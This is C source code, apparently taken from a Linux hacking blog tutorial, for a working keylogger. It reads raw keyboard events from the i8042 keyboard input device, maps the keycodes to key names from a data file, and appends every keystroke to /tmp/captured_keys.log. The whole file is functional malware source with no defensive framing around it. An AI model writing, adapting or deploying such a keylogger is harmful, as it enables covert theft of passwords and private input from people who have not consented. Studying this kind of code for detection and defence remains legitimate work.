// Source: https://cocomelonc.github.io/linux/2025/06/03/linux-hacking-5.html
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <linux/input.h>
#include <fcntl.h>
#include <string.h>
#define event_buf_len 50
#define ERROR_PATH "/tmp/errors_keylogger.log"
#define CAPTURE_PATH "/tmp/captured_keys.log"
#define KEYLOG 1
#define ERROR 0
#define LONGEST_KEY 22

typedef struct keys_s
{
	char key[LONGEST_KEY + 1];
	int size;
	FILE *file;
} keys_t;

int detect_path_event_file(char *event_file); 
int create_socket(const char *event_path, FILE **file, int *fd, FILE **logs);
int create_logs_files(FILE ** logs);
int read_from_eventX(struct input_event *ev, int fd);
int	translate_keycode(unsigned short code, keys_t *keys);
int	write_captured_key(FILE *file, const char *key);

int detect_path_event_file(char *event_file)
{
	char relative_path[10];
	unsigned short len;
	char *last;
	int size;

	size = event_buf_len;
	len = 10;
	if (readlink("/dev/input/by-path/platform-i8042-serio-0-event-kbd", \
					relative_path, len - 1) < 0)
			return (0);
		relative_path[len - 1] = '\0';
		printf("ev: %s\n", relative_path);
		last = stpncpy(event_file, "/dev/input/", size);
		size -= 11;
		strncpy(last, &relative_path[3], size);
		size -= strlen(&relative_path[3]);
		printf("full: %s\n", event_file);
		return (1);
}

int main(void)
{
	struct input_event ev;
	keys_t keys;
	int fd;
	char event_file[event_buf_len];
	FILE *logs[2] = {NULL, NULL};


	keys.size = LONGEST_KEY + 1;
	ev.code = 0;
	if (!detect_path_event_file(event_file))
	{
		fprintf(stderr, "Problem with the readlink function\n");
		return (1);
	}
	if (!create_socket(event_file, &keys.file, &fd, logs))
		return (1);
	while (ev.code != 1)
	{
		memset(&ev, 0, sizeof(ev));
		if (!read_from_eventX(&ev, fd))
		{
			fprintf(logs[ERROR], "Unable to read in the fd of eventX\n");
			break;
		}
		if (ev.type == EV_KEY && ev.value == 1)
		{
			printf("keycode\t%d\n\n", ev.code);
			if (!translate_keycode(ev.code, &keys))
				strncpy(keys.key, "UNKNOW", keys.size);
			printf("key translated: %s\n", keys.key);
			write_captured_key(logs[KEYLOG], keys.key);
		}
		fflush(stdout);
	}
	close(fd);
	fclose(keys.file);
	if (logs[KEYLOG])
		fclose(logs[KEYLOG]);
	if (logs[ERROR])
		fclose(logs[ERROR]);
}

int create_socket(const char *event_path, FILE **file, int *fd, FILE *logs[])
{
	*fd = open(event_path, O_RDONLY);
	if (!create_logs_files(logs))
	{
		fprintf(stderr, "Unable to create log files\n");
		return (0);
	}
	if (*fd < 0)
	{
		fprintf(logs[ERROR], "Unable to read event, is it in sudo ?\n");
		return (0);
	}
	*file = fopen("./keys.dat", "r");
	if (!*file)
	{
		fprintf(logs[ERROR], "Unable to read keys.dat file\n");
		return (0);
	}
	return (1);
}

int create_logs_files(FILE *logs[])
{
	FILE *error_logs;
	FILE *capture_logs;

	if (access(ERROR_PATH, W_OK) < 0)
	{
		error_logs = fopen(ERROR_PATH, "a");
		if (!error_logs)
			return (0);
		logs[ERROR] = error_logs;
	}
	capture_logs = fopen(CAPTURE_PATH, "a");
	if (!capture_logs)
		return (0);
	logs[KEYLOG] = capture_logs;
	return (1);
}

int read_from_eventX(struct input_event *ev, int fd)
{
	ssize_t n;

	n = read(fd, ev, sizeof(*ev));
	if (n < 0)
		return (0);
	return (1);
}

int	translate_keycode(unsigned short code, keys_t *keys)
{
	char *line;
	size_t size_line;
	unsigned short lcode;
	int i;
	int	ki;

	size_line = 0;
	line = NULL;
	ki = 0;
	keys->key[ki] = '\0';
	rewind(keys->file);
	while (getline(&line, &size_line, keys->file) > EOF \
			&& keys->key[0] == '\0')
	{
		i = 0;
		lcode = 0;
		while (line[i] != ' ' && line[i] != '\t')
			lcode = lcode * 10 + (line[i++] - '0');
		if (lcode != code)
			continue;
		while (line[i++] != '#')
			;
		++i;
		while (line[i] != '\n' && ki < keys->size - 1)
			keys->key[ki++] = line[i++];
		keys->key[ki] = '\0';
	}
	free(line);
	if (!keys->key[0])
		return (0);
	return (1);
}

int	write_captured_key(FILE *file, const char *key)
{
	if (strcmp(key, "Enter") == 0)
	{
		if (fprintf(file, "\n") < 0)
			return (0);
	}
	else
		if (fprintf(file, "%s", key) < 0)
			return (0);
	fprintf(file, "%c", '|');
	return (1);
}
